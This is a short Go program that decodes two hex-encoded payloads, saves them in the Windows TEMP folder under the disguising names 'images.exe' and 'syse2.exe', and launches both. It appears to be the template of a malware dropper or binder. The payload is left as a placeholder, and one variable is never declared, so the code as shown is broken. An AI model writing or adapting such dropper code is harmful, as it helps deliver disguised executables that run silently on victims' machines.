package main

import (
 "encoding/hex"
 "io/ioutil"
 "os"
 "os/exec"
)

func main() {
 hex_data1 := "-HEXDATA-"
 data1, _ := hex.DecodeString(hex_data1)
 data2, _ := hex.DecodeString(hex_data2)
 tempDir := os.Getenv("TEMP")
 tempFile1 := tempDir + "\\images.exe"
 tempFile2 := tempDir + "\\syse2.exe"
 ioutil.WriteFile(tempFile1, data1, 0755)
 ioutil.WriteFile(tempFile2, data2, 0755)
 exec.Command(tempFile1).Start()
 exec.Command(tempFile2).Start()
}